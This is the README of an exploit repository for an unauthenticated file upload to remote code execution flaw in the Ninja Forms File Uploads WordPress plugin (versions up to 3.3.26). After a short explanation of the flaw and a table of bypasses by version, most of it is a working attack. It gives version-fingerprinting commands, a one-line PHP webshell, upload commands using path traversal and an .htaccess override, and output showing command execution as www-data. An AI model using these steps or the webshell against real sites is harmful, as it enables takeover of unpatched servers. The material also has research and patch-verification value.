# CVE-2026-0740

### Ninja Forms File Uploads <= 3.3.26 - Unauthenticated Arbitrary File Upload to RCE

Exploit for [CVE-2026-0740](https://www.cve.org/CVERecord?id=CVE-2026-0740) discovered by [Selim Lanouar (whattheslime)](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/selim-lanouar).

For a complete technical deep dive, read the [full article on Lexfo's blog](https://blog.lexfo.fr/ninja-forms-uploads_rce.html).

## Disclaimer

This repository is provided for **research and defensive security purposes only**.

The author assumes no responsibility for misuse of this information.

---

## Overview

The **Ninja Forms - File Uploads** plugin for WordPress is vulnerable to **Unauthenticated Arbitrary File Upload** leading to **Remote Code Execution** in all versions up to and including **3.3.26**.

The vulnerability was originally discovered and reported on version **3.3.23**. Exploitation is straightforward up to version **3.3.24** (no validation on the destination filename). Versions **3.3.25** and **3.3.26** introduced successive partial patches, but the issue is fully resolved only in version **3.3.27**.

The vulnerability chain is as follows:

1. An unauthenticated user obtains a valid upload nonce via the `nf_fu_get_new_nonce` AJAX action with an arbitrary `field_id`.
2. The `nf_fu_upload` handler validates the uploaded file's extension (e.g. `image.jpg`), but allows the client to override the destination filename via a POST parameter (`image_jpg`).
3. The destination filename is passed to `move_uploaded_file()` without proper sanitization, enabling arbitrary extensions and path traversal (`../`).

| Vector / Extension | <= 3.3.24 | 3.3.25 | 3.3.26 | 3.3.27 |
|---|:---:|:---:|:---:|:---:|
| Path traversal (`../`) | PASS | - | - | - |
| `.php` | PASS | - | - | - |
| `.phtml`, `.phar` | PASS | PASS | - | - |
| `.pht` | PASS | PASS | PASS | - |
| `.html`, `.svg`, `.js` | PASS | PASS | PASS | - |

See the [full blog post](https://blog.lexfo.fr/ninja-forms-uploads_rce.html) for the complete extension table and technical deep dive.

---

## Exploitation

### Prerequisites

- **Ninja Forms** plugin installed and activated.
- **Ninja Forms - File Uploads** extension installed and activated (<= 3.3.26).
- No active form or pre-existing file upload field is required.

### Setup

```bash
python3 -m venv .venv
.venv/bin/pip install -r requirements.txt
.venv/bin/python3 CVE-2026-0740.py -h
```

#### Upload a file (no path traversal)

```bash
python3 CVE-2026-0740.py -t http://localhost:8000 -f test.txt
```

The file will be written to `wp-content/uploads/ninja-forms/tmp/test.txt`.

#### Upload with path traversal (<= 3.3.24)

```bash
python3 CVE-2026-0740.py -t http://localhost:8000 -f webshell.php -d ../../../webshell.php
```

The file will be written to `wp-content/webshell.php`.

#### Upload with custom destination filename

```bash
python3 CVE-2026-0740.py -t http://localhost:8000 -f evil-htaccess -d .htaccess
```

#### Example

```bash
# 1. Detect version
httpx -fr -u http://localhost:8000 -ms 'file_uploads_nfpluginsettings-js' -er 'nfpluginsettings\.js\?ver=[\d\.]+' 2>/dev/null
http://localhost:8000 [nfpluginsettings.js?ver=3.3.24]

# 2. Write webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/slime.php

# 3. Upload
python3 CVE-2026-0740.py -t http://localhost:8000 -f /tmp/slime.php -d ../ws.php
[2026-04-07] [20:20:11] [info] [http://localhost:8000] Fetch nonce for random field_id: 3711569793384815...
[2026-04-07] [20:20:12] [success] [http://localhost:8000] Got ninja-forms-upload nonce: a320b7ed4a
[2026-04-07] [20:20:12] [info] [http://localhost:8000] Uploading slime.php as ../ws.php via POST parameter...
[2026-04-07] [20:20:12] [success] [http://localhost:8000] File uploaded at: http://localhost:8000/wp-content/uploads/ninja-forms/ws.php

# 4. Execute commands
curl http://localhost:8000/wp-content/uploads/ninja-forms/ws.php\?cmd\=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## References

* [Blog post - Technical deep dive](https://blog.lexfo.fr/ninja-forms-uploads_rce.html)
* [CVE-2026-0740](https://www.cve.org/CVERecord?id=CVE-2026-0740)
* [Wordfence - 50,000 WordPress Sites Affected](https://www.wordfence.com/blog/2026/04/50000-wordpress-sites-affected-by-arbitrary-file-upload-vulnerability-in-ninja-forms-file-upload-wordpress-plugin/)
* [Wordfence - Vulnerability Details](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/ninja-forms-uploads/ninja-forms-file-upload-3326-unauthenticated-arbitrary-file-upload)
